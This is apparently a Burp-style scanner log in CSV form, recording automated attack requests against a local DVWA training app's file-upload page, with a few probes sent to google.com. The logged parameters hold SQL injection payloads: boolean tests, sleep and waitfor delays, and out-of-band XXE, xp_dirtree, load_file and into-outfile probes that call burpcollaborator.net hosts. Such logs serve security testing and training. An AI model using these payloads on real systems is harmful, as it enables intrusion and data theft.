Number,Complete,Tool,Host,Method,Path,Query,Params,Status,ResponseLength,MimeType,UrlExtension,Comment,IsSSL,NewCookies,RequestTime,ResponseTime,ResponseDelay,ListenerInterface,Regex1Req,Regex1Resp,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:01,2018/05/16 00:30:01,903ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,false,302,0,HTML,,,false,,2018/05/16 00:30:01,2018/05/16 00:30:01,922ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:01,2018/05/16 00:30:01,931ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,false,302,0,HTML,,,false,,2018/05/16 00:30:01,2018/05/16 00:30:01,948ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:01,2018/05/16 00:30:01,953ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,https://www.google.com,GET,/recaptcha/api/challenge,k=Array&126481822'%20or%20'7464'%3d'7459=1,true,200,67,script,,,true,,2018/05/16 00:30:01,2018/05/16 00:30:01,967ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,false,302,0,HTML,,,false,,2018/05/16 00:30:01,2018/05/16 00:30:01,974ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:01,2018/05/16 00:30:01,981ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,false,302,0,HTML,,,false,,2018/05/16 00:30:01,2018/05/16 00:30:01,995ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:02,2018/05/16 00:30:02,117ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,false,302,0,HTML,,,false,,2018/05/16 00:30:02,2018/05/16 00:30:02,132ms,,
0,true,Scanner,https://www.google.com,GET,/recaptcha/api/challenge,k=Array&158512778'%20or%202183%3d2183--%20=1,true,200,67,script,,,true,,2018/05/16 00:30:02,2018/05/16 00:30:02,160ms,,
0,true,Scanner,https://www.google.com,GET,/recaptcha/api/challenge,k=Array&155992620'%20or%202395%3d2388--%20=1,true,200,67,script,,,true,,2018/05/16 00:30:02,2018/05/16 00:30:02,357ms,,
0,true,Scanner,https://www.google.com,GET,/recaptcha/api/challenge,k=Array&1'%20and%20'2372'%3d'2372=1,true,200,67,script,,,true,,2018/05/16 00:30:02,2018/05/16 00:30:02,868ms,,
0,true,Scanner,https://www.google.com,GET,/recaptcha/api/challenge,k=Array&1'%20and%20'4923'%3d'4919=1,true,200,67,script,,,true,,2018/05/16 00:30:03,2018/05/16 00:30:03,76ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,123ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,141ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,150ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,160ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,false,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,167ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,5101,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,175ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,188ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,198ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,j3nz1v6jnh=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,206ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,5051,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,247ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ksffr%20SYSTEM%20%22http%3a%2f%2fm6tfydphv2q91a3ecus6hieyapgk4nshf83x.burpcollab'%7c%7c'orator.net%2f%22%3e%25ksffr%3b]%3e')%2c'%2fl')%20from%20dual)=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,266ms,,
0,true,Scanner,https://www.google.com,GET,/recaptcha/api/challenge,k=Array&1'%20and%201795%3d1795--%20=1,true,200,67,script,,,true,,2018/05/16 00:30:03,2018/05/16 00:30:03,267ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,273ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20ksffr%20SYSTEM%20%22http%3a%2f%2fqnhjfh6lc67diekity9aymv2rtxols9mwdk2.burpcollab'%7c%7c'orator.net%2f%22%3e%25ksffr%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,283ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,285ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqwqjohfll6gdreti2yia7m420t6oufk3eq5eu.burpcollab'%2b'orator.net%5ceee'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,299ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,302ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cridkai1m772edffjoz4btnq3muspgg741rsfh.burpcollab'%2b'orator.net%5cqlk'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,317ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,320ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cbq54i296fraylzn3wjcv17ynue09o0goab1zq.burpcollab'%2b'orator.net%5cxxh'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,331ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,334ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cfra8j6aagvb2m3o7xndz2bzrvi1dp4iscf33s.burpcollab'%2b'orator.net%5cjmi'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,345ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,349ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,(select%20load_file('%5c%5c%5c%5cdyf6q4h8nti0t1v54lkx996p2g8bw2yqsdj18.burpcollaborator.net%5c%5cihm'))=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,360ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,363ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1'%2b(select%20load_file('%5c%5c%5c%5c0yztqrhvngintovs48kk9w6c238ywpzdt0ko9.burpcollaborator.net%5c%5cwyi'))%2b'=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,375ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,379ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20into%20outfile%20'%5c%5c%5c%5cirdbj9adgyb5m6oaxqd22ezuvl1gp7tvnie63.burpcollaborator.net%5c%5cchy'%3b%20--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,388ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,392ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1'=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,403ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,407ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,(select*from(select(sleep(20)))a)=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,425ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%2b(select*from(select(sleep(20)))a)%2b=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,437ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20and%20(select*from(select(sleep(20)))a)--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,453ms,,
0,true,Scanner,https://www.google.com,GET,/recaptcha/api/challenge,k=Array&1'%20and%209578%3d9575--%20=1,true,200,67,script,,,true,,2018/05/16 00:30:03,2018/05/16 00:30:03,454ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20waitfor%20delay'0%3a0%3a20'--=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,470ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1)waitfor%20delay'0%3a0%3a20'--=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,483ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%2c0)waitfor%20delay'0%3a0%3a20'--=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,493ms,,
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,122889388%20or%204779%3d04779=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,500ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,5251,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,504ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,116207747%20or%207428%3d7425=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,517ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,521ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,179187924%20or%207540%3d7540=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,535ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,539ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,128264255%20or%208497%3d84970=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,550ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,554ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,142550020%20or%203065%3d03065--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,566ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,570ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,113418160%20or%209229%3d9227--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,582ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,586ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,110759329%20or%206820%3d6820--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,599ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,603ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,163709876%20or%205916%3d59160--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,617ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,620ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20and%207259%3d07259=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,631ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,634ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20and%207691%3d7685=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,647ms,,
0,true,Scanner,https://www.google.com,GET,/recaptcha/api/challenge,k=Array&1%22=1,true,200,67,script,,,true,,2018/05/16 00:30:03,2018/05/16 00:30:03,648ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,651ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20and%201997%3d1997=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,665ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,669ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20and%206518%3d65180=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,682ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,686ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20and%206660%3d06660--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,699ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,703ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20and%206406%3d6399--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,714ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,718ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20and%206169%3d6169--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,732ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,735ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,1%20and%201028%3d10280--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,747ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,750ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,118242904'%20or%20'4722'%3d'4722=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,763ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,766ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,174181986'%20or%20'2853'%3d'2850=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,780ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,783ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,113850975'%20or%20'6109'%3d'6109=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,798ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,801ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,117163903'%20or%20'5789'%3d'5789'=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,815ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,819ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,162926451'%20or%201780%3d1780--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,832ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,835ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,112758030'%20or%207670%3d7668--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,847ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,850ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,112934666'%20or%209361%3d9361--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,865ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/upload/index.php,,false,200,4951,HTML,php,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,868ms,,Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,POST,/vulnerabilities/upload/,117028439'%20or%201609%3d1609'--%20=1,true,302,0,HTML,,,false,,2018/05/16 00:30:03,2018/05/16 00:30:03,882ms,,
